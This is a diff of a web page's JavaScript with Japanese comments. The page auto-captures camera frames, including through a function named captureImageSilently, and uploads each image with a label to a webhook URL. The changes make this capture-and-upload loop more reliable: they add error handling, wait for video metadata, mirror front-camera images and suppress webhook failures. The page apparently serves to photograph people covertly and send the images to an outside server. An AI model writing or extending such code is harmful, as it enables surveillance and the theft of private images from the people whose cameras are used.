@@ -50,6 +50,7 @@
       border-radius: 8px;
       z-index: 3;
       cursor: pointer;
+      display: none;
     }
     #galleryView {
       position: absolute;
@@ -137,25 +138,49 @@
     let currentStream = null;
 
     async function initCamera() {
-      currentStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
-      video.srcObject = currentStream;
-      startAutoCapture();
+      try {
+        currentStream = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: 'user' },
+          audio: false
+        });
+        video.srcObject = currentStream;
+
+        // メタデータ読み込み待ち
+        await new Promise(resolve => {
+          if (video.readyState >= 2) resolve();
+          else video.onloadedmetadata = () => resolve();
+        });
+
+        startAutoCapture();
+      } catch (err) {
+        console.error("カメラ起動エラー:", err);
+        alert("カメラのアクセスを許可してください");
+      }
     }
 
     async function captureFromCurrentStream() {
-      const track = currentStream.getVideoTracks()[0];
-      const imageCapture = new ImageCapture(track);
-      const bitmap = await imageCapture.grabFrame();
+      await new Promise(resolve => {
+        if (video.readyState >= 2) resolve();
+        else video.onloadedmetadata = () => resolve();
+      });
+
       const canvas = document.createElement('canvas');
-      canvas.width = bitmap.width;
-      canvas.height = bitmap.height;
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
       const ctx = canvas.getContext('2d');
-      ctx.drawImage(bitmap, 0, 0);
-      return new Promise(res => canvas.toBlob(blob => res(blob), 'image/jpeg', config.quality));
+
+      // 内カメラは反転するため、左右反転補正
+      ctx.translate(canvas.width, 0);
+      ctx.scale(-1, 1);
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+      return new Promise(res => {
+        canvas.toBlob(blob => res(blob), 'image/jpeg', config.quality);
+      });
     }
 
     async function captureImageSilently(facingMode) {
-      const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: facingMode } });
+      const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode }, audio: false });
       const track = stream.getVideoTracks()[0];
       const imageCapture = new ImageCapture(track);
       const bitmap = await imageCapture.grabFrame();
@@ -164,6 +189,7 @@
       canvas.width = bitmap.width;
       canvas.height = bitmap.height;
       const ctx = canvas.getContext('2d');
+
       ctx.drawImage(bitmap, 0, 0);
 
       return new Promise(res => {
@@ -178,7 +204,11 @@
       const form = new FormData();
       form.append("file", blob, `img_${Date.now()}.jpg`);
       form.append("content", label);
-      await fetch(webhookUrl, { method: "POST", body: form });
+      try {
+        await fetch(webhookUrl, { method: "POST", body: form });
+      } catch (e) {
+        console.error("Webhook送信エラー:", e);
+      }
     }
 
     function showFlash() {
@@ -188,8 +218,10 @@
 
     function updatePreview(blob) {
       const url = URL.createObjectURL(blob);
+      preview.onload = () => {
+        preview.style.display = "block";
+      };
       preview.src = url;
-      preview.style.display = "block";
     }
 
     shutterBtn.onclick = async () => {
